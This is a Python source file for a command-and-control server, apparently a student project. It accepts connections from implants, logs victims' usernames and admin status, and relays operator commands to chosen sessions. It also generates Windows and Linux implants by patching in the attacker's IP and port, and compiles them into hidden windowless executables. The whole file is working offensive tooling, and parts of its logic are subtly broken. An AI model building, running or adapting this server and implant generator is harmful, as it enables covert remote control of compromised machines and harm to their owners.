import socket
import threading
from prettytable import PrettyTable
import time 
from datetime import datetime
import string, random, os
import os.path
import shutil
import subprocess
import sys


def banner():
    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')


def listener_handler(): # Function to handle incoming connections and send bytes over the socket
    sock.bind((host_ip, int(host_port)))
    print(f'[+] Awaiting connection from client on {host_ip}:{host_port}')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def comm_in(target_id):
    print(f'[+] Awaiting response...')
    response = target_id.recv(1024).decode()
    return response

def comm_out(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id):
    while True:
        message = input('Send message#> ')
        comm_out(target_id, message)
        if message == 'exit':
            target_id.send(message.encode())
            target_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session')
                target_id.close()
                break
            print(response)

def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            if admin == 1:
                admin_value = 'Yes'
            elif username == 'root':
                admin_value = 'Yes'
            else:
                admin_value = 'No'
            cur_time = time.strftime("%H:%M:%S",time.localtime())
            date = datetime.now()
            time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value]) #Appending info to targets list
                print(f'[+] Connection recieved from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else: 
                targets.append([remote_target, remote_ip[0], time_record])
                print(f'[+] Connection recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")  
        except:
            pass

def winplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    f_name= f'{random_name}.py'
    file_loc = os.path.expanduser('~/Bachelor_C2/implant/winplant.py')
    implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
    if os.path.exists(file_loc):
        shutil.copy('winplant.py', f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'[-] winplant.py not found in {file_loc}')
    with open(f'{implant_loc}/{f_name}') as f:
        patch_host = f.read().replace('INPUT_IP', host_ip)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        patch_port = f.read().replace('INPUT_PORT', host_port)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_port)
        f.close()
    py_loc = os.path.join(implant_loc, f_name)
    if os.path.exists(py_loc):
        print(f'{f_name} saved to {implant_loc}')
        
    else:
        print('[-] An error occurred while saving the implant')
        

def linplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    f_name= f'{random_name}.py'
    file_loc = os.path.expanduser('~/Bachelor_C2/implant/linplant.py')
    implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
    if os.path.exists(file_loc):
        shutil.copy('linplant.py', f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'[-] linplant.py not found in {file_loc}')
    
    with open(f'{implant_loc}/{f_name}') as f:
        patch_host = f.read().replace('INPUT_IP', host_ip)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        patch_port = f.read().replace('INPUT_PORT', host_port)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_port)
        f.close()
    py_loc = os.path.join(implant_loc, f_name)
    if os.path.exists(py_loc):
        print(f'{f_name} saved to {implant_loc}')

def winPYexe():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    f_name= f'{random_name}.py'
    exe_file = f'{random_name}.exe'
    file_loc = os.path.expanduser('~/Bachelor_C2/implant/winplant.py')
    implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
    if os.path.exists(file_loc):
        shutil.copy('winplant.py', f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'[-] winplant.py not found in {file_loc}')
    with open(f_name) as f:
        patch_host = f.read().replace('INPUT_IP', host_ip)
    with open(f_name, 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f_name) as f:
        patch_port = f.read().replace('INPUT_PORT', host_port)
    with open(f_name, 'w') as f:
        f.write(patch_port)
        f.close()
    exe_file_loc = os.path.join(implant_loc, f_name)
    pyinstaller_exec = f'pyinstaller "{exe_file_loc}" -w --clean --onefile --distpath .'
    print(f'[+] Compiling executable {exe_file}. . .')
    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL, shell=True)
    os.remove(f'{random_name}.spec')
    shutil.rmtree('build')
    shutil.move(exe_file, implant_loc)
    exe_loc = os.path.join(implant_loc, exe_file)
    if os.path.exists(exe_loc):
        print(f'{exe_file} saved to {implant_loc}')
        shutil.rmtree(f_name)
    else:
        print('[-] An error occurred while compiling')

   
if __name__ == '__main__':
    targets = [] #store each socket connection
    listener_count = 0
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    

    if not os.path.exists('Generated_Implants'):
            print("[+] Creating Generated Implants Directory...")
            os.mkdir('Generated_Implants')

    while True:
        try:
            command = input('Enter command#>')
            if command == 'listeners -g':
                host_ip = input('[+] Enter the IP to listen on: ') 
                host_port = input('[+] Enter listening port: ')
                listener_handler()
                listener_count +=1
            elif command == 'winplant':
                if listener_count > 0:
                    winplant()
                else:
                    print('[-] Cannot generate payload without active listener')
            elif command == 'linplant':
                if listener_count > 0:
                    linplant()
                else:
                    print('[-] Cannot generate payload without active listener')
            elif command == 'winPYexe':
                if listener_count > 0:
                    winPYexe()
                else:
                    print('[-] Cannot compile payload without active listener')
            elif command == 'quit':
                sys.exit()
            
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    session_table = PrettyTable()
                    session_table.field_names = ['Session','Username', 'Admin' ,'Status' ,'Target','Check-in Time']
                    session_table.padding_width = 3
                    for target in targets:
                        session_table.add_row([session_counter, target[3],target[4],'Placeholder', target[1], target[2]])
                        session_counter += 1
                    print(session_table)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    target_id = (targets[num])[0]
                    target_comm(target_id)
        except KeyboardInterrupt:
            print('\n[-] Keyboard interupt iniated by user')
            kill_flag = 1
            sock.close()
            break
